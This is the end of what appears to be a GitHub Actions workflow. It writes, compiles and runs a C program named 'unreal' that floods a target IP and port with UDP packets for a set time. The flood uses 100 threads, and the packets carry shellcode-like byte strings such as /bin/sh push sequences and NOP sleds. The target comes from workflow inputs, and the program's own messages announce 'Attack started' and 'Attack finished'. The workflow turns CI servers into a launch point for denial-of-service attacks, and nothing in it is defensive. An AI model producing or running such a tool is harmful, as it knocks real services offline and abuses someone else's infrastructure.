                "\xEB\xFE",
                "\xC0\xA8\x00\x68",
                "\x68\x65\x6C\x6C\x6F\x20\x57\x6F\x72\x6C\x64\x21",
                "\x68\x2F\x62\x69\x6E\x89\xe3\x6A\x0B\x58",
                "\xB8\x01\x00\x00\x00\xFF\xD0",
                "\x68\x7F\x00\x00\x01",
                "\x48\x31\xc0\x48\x89\xc2\x48\x89\xe7",
                "\xFF\xFF\xFF\xFF\xFF\xFF",
                "\xC3",
                "\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xe3",
                "\x90\x90\x90\x90\x90",
                "\xBA\xAD\xF0\x0D",
                "\x48\x31\xc0\x48\x89\xc2\x48\x89\xe7",
                "\x68\x2F\x62\x69\x6E\x89\xe3\x6A\x0B\x58",
                "\xB8\x01\x00\x00\x00\xFF\xD0",
                "\x68\x7F\x00\x00\x01",
                "\x90\x90\x90\x90\x90",
                "\xEB\xFE",
                "\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xe3",
                "\xFF\xD0",
                "\xC3",
                "\xBA\xAD\xF0\x0D"
            };
            
            sock = socket(AF_INET, SOCK_DGRAM, 0);
            addr.sin_family = AF_INET;
            addr.sin_port = htons(port);
            addr.sin_addr.s_addr = inet_addr(ip);
            
            endtime = time(NULL) + duration;
            
            int num_payloads = sizeof(payloads) / sizeof(payloads[0]);
            
            while (time(NULL) <= endtime) {
                for (int i = 0; i < num_payloads; i++) {
                    sendto(sock, payloads[i], strlen(payloads[i]), 0, (struct sockaddr*)&addr, sizeof(addr));
                }
            }
            
            close(sock);
            return NULL;
        }
        
        int main(int argc, char *argv[]) {
            if (argc != 4) {
                printf("Usage: ./unreal <ip> <port> <time>\n");
                return 1;
            }
            
            int threads = 100;
            pthread_t thread_ids[threads];
            
            printf("Attack started on %s:%s for %s seconds with %d threads\n", argv[1], argv[2], argv[3], threads);
            
            for (int i = 0; i < threads; i++) {
                pthread_create(&thread_ids[i], NULL, send_packets, (void*)argv);
                printf("Launched thread: %d\n", i);
            }
            
            for (int i = 0; i < threads; i++) {
                pthread_join(thread_ids[i], NULL);
            }
            
            printf("Attack finished!\n");
            return 0;
        }
        EOF
        
        gcc -o unreal unreal.c -lpthread
        ./unreal ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} ${{ github.event.inputs.duration }}
